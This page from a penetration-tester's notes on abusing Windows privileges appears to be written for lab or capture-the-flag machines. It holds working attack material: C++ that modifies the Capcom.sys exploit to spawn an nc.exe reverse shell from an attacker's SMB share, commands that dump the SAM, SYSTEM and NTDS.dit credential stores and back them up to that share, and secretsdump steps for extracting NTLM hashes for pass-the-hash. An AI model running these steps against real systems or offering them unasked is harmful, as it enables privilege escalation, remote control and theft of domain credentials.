---
layout: default
title: Windows Privileges
parent: EXPLOITATION
has_children: false
has_toc: false
---

{% include toc.html %}

## SeLoadDriverPrivilege
### Capcom.sys exploit
If the user has `SeLoadDriverPrivilege` enabled (or disabled, it can be enabled) then a Capcom.sys exploit should get you root. You need three items for this:
1. EoPLoadDriver, available [here](https://github.com/TarlogicSecurity/EoPLoadDriver)
2. ExploitCapcom, available [here](https://github.com/tandasat/ExploitCapcom)
3. Capcom-Rootkit, available [here](https://github.com/FuzzySecurity/Capcom-Rootkit)

### Compiling EoPLoadDriver with VS2019
Later versions of C++ no longer use `stdafx.h` for precompiled headers. The `EoPLoadDriver` project references `stdafx.h` so fails to compile. To solve, create a new VS2019 C++ console app which will create new precompiled header files, `pch.h` and `pch.cpp`. Copy both files to the `EoPLoadDriver` project, change the `stdafx.h` references to `pch.h` references and the project should compile without errors.

### Updating ExploitCapcom to a Reverse Shell
`ExploitCapcom` is written to run interactively and open a new terminal windows with elevated privileges. A reverse shell is not an interactive environment, so it looks like the exploit has failed when executed within a reverse shell. To solve, update the `LaunchShell()` function to add a `CommandLine` parameter and pop a reverse shell from a smb share on the attacking machine. Don't forget to start another netcat listener to catch the second shell.

```c++
// Launches a command shell process
static bool LaunchShell()
{
    // This should be cmd.exe.
    TCHAR ApplicationName[] = TEXT("C:\\Windows\\system32\\cmd.exe");

    // Add this to call cmd.exe and pop a shell from a samba share.
    TCHAR CommandLine[] = TEXT("cmd /c \\\\10.10.14.18\\share\\nc.exe 10.10.14.18 5556 -e C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };

    // Change arg2 to CommandLine to pass the command line parameter to CreateProcess.
    if (!CreateProcess(ApplicationName, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

### References
The articles to read are:

https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/

http://www.fuzzysecurity.com/tutorials/28.html

## SeBackupPrivilege
This allows you to read, and therefore copy/backup, any file on the system. If you also find you have `SeNotifyChangePrivilege`, think SAM, SYSTEM, SECURITY and NTDS.dit. If you can backup these files, you can extract the hashes and try Pass The Hash (PTH) or try and crack them using Hashcat. Copying these files while they are in use is a pain but doable:
```
cmd /c reg save HKLM\SAM SAM
cmd /c reg save HKLM\SYSTEM SYSTEM
```

To backup `NTDS.dit`, take a backup of the file using (the SMB share will need to be on a Windows box as an NTFS file system is needed for this to work):
```
cmd /c wbadmin start backup -backuptarget:\\10.10.14.18\smb\ -include:C:\Windows\NTDS\NTDS.dit -quiet
``` 

Once backed up, on a Windows box, use `Computer Management > Storage > Disk Management` to attach the image (.VHD) and assign a drive letter. With a drive letter assigned, the `NTDS.dit` file can be copied in the normal way. You can then use `impacket-secretsdump.py` to extract `NTLM` hashes and use them for PTH with Evil-WinRM, CME or PTH-Tools:
```
$ impacket-secretsdump -sam SAM -system SYSTEM -ntds ntds.dit LOCAL > hashes
$ cat hashes | grep Administrator
```

### SeNotifyChangePrivilege
This allows you to access a file directly using the path when you would not be permitted to browse to it. See `SeBackupPrivilege` for example.
